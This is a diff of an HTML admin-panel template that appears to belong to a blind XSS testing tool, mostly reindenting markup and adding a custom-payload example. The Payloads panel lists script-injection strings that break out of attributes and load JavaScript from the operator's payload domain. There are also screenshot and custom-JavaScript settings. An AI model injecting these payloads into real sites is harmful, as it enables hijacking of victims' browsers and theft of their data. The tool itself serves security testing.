@@ -1,85 +1,96 @@
 <div class="wrapper">
 
-  {{menu}}
+    {{menu}}
 
-  <section class="content">
-      <div class="container-fluid">
-        <div class="row">
-          <div class="col-lg-12">
-            <div class="view-header">
-              <div class="header-title">
-                <h3 class="m-b-xs">Payload</h3>
-                <small>Get an payload or update your custom payload</small>
-              </div>
-            </div>
-            <hr>
-          </div>
-        </div>
-
-        <div class="row">
-
-          <div class="col-lg-12"><div id="alert"></div></div>
-
-          <div class="col-lg-6">
-            <div class="panel panel-filled">
-              <div class="panel-heading">Payloads</div>
-              <div class="panel-body">
-                <div class="form-group">
-                  <label class="control-label">Script src</label>
-                  <input value='<script src=//{{setting[payload-domain]}}></script>' disabled class="form-control"><br>
-
-                  <label class="control-label">Script src with closing tag</label>
-                  <input value='"><script src=//{{setting[payload-domain]}}></script>' disabled class="form-control"><br>
-
-                  <label class="control-label">Script src with closing and opening tag</label>
-                  <input value='"><script src=//{{setting[payload-domain]}}></script><x="' disabled class="form-control"><br>
-
-                  <label class="control-label">jQuery</label>
-                  <input value='$.getScript("//{{setting[payload-domain]}}")' disabled class="form-control"><br>
-
-                  <label class="control-label">Create Element</label>
-                  <input value="javascript:eval('var a=document.createElement(\'script\');a.src=\'//{{setting[payload-domain]}}\';document.body.appendChild(a)')" disabled class="form-control">
+    <section class="content">
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-lg-12">
+                    <div class="view-header">
+                        <div class="header-title">
+                            <h3 class="m-b-xs">Payload</h3>
+                            <small>Get an payload or update your custom payload</small>
+                        </div>
+                    </div>
+                    <hr>
                 </div>
-              </div>
-            </div>
-          </div>
-
-          <div class="col-lg-6">
-
-            <div class="panel panel-filled">
-              <div class="panel-heading">Screenshot</div>
-              <div class="panel-body">
-                <form class="form" id="screenshot-settings">
-                  <div class="form-group">
-                    {{csrf[]}}
-                    <label class="control-label" for="screenshot">Screenshot</label>
-                    <select class="form-control" id="screenshot">
-                      <option {{screenshotSelected[1]}} value="1">Enable screenshots</option>
-                      <option {{screenshotSelected[0]}} value="0">Disable screenshots</option>
-                    </select>
-                  </div>
-                  <button class="btn">Save</button>
-                </form>
-              </div>
             </div>
 
-            <div class="panel panel-filled">
-              <div class="panel-heading">Secondary Payload</div>
-              <div class="panel-body">
-                <form class="form" id="payload-settings">
-                  <div class="form-group">
-                    {{csrf[]}}
-                    <label class="control-label" for="customjs">Custom javascript</label>
-                    <textarea type="text" name="customjs" id="customjs" class="form-control" rows=5>{{setting[customjs]}}</textarea>
-                  </div>
-                  <button class="btn">Save</button>
-                </form>
-              </div>
+            <div class="row">
+
+                <div class="col-lg-12">
+                    <div id="alert"></div>
+                </div>
+
+                <div class="col-lg-6">
+                    <div class="panel panel-filled">
+                        <div class="panel-heading">Payloads</div>
+                        <div class="panel-body">
+                            <div class="form-group">
+                                <label class="control-label">Script src</label>
+                                <input class="form-control" disabled
+                                       value='<script src=//{{setting[payload-domain]}}></script>'><br>
+
+                                <label class="control-label">Script src with closing tag</label>
+                                <input class="form-control" disabled
+                                       value='"><script src=//{{setting[payload-domain]}}></script>'><br>
+
+                                <label class="control-label">Script src with closing and opening tag</label>
+                                <input class="form-control" disabled
+                                       value='"><script src=//{{setting[payload-domain]}}></script><x="'><br>
+
+                                <label class="control-label">jQuery</label>
+                                <input class="form-control" disabled
+                                       value='$.getScript("//{{setting[payload-domain]}}")'><br>
+
+                                <label class="control-label">Create Element</label>
+                                <input class="form-control"
+                                       disabled value="javascript:eval('var a=document.createElement(\'script\');a.src=\'//{{setting[payload-domain]}}\';document.body.appendChild(a)')"><br>
+
+                                <label class="control-label">Custom Payload example</label>
+                                <input class="form-control" disabled
+                                       value='<script src=//{{setting[payload-domain]}}/custom></script>'><br>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-lg-6">
+
+                    <div class="panel panel-filled">
+                        <div class="panel-heading">Screenshot</div>
+                        <div class="panel-body">
+                            <form class="form" id="screenshot-settings">
+                                <div class="form-group">
+                                    {{csrf[]}}
+                                    <label class="control-label" for="screenshot">Screenshot</label>
+                                    <select class="form-control" id="screenshot">
+                                        <option value="1" {{screenshotSelected[1]}}>Enable screenshots</option>
+                                        <option value="0" {{screenshotSelected[0]}}>Disable screenshots</option>
+                                    </select>
+                                </div>
+                                <button class="btn">Save</button>
+                            </form>
+                        </div>
+                    </div>
+
+                    <div class="panel panel-filled">
+                        <div class="panel-heading">Secondary Payload</div>
+                        <div class="panel-body">
+                            <form class="form" id="payload-settings">
+                                <div class="form-group">
+                                    {{csrf[]}}
+                                    <label class="control-label" for="customjs">Custom javascript</label>
+                                    <textarea class="form-control" id="customjs" name="customjs" rows=5 type="text">{{setting[customjs]}}</textarea>
+                                </div>
+                                <button class="btn">Save</button>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
             </div>
-          </div>
 
         </div>
-
-      </div>
-  </section>
+    </section>
 </div>
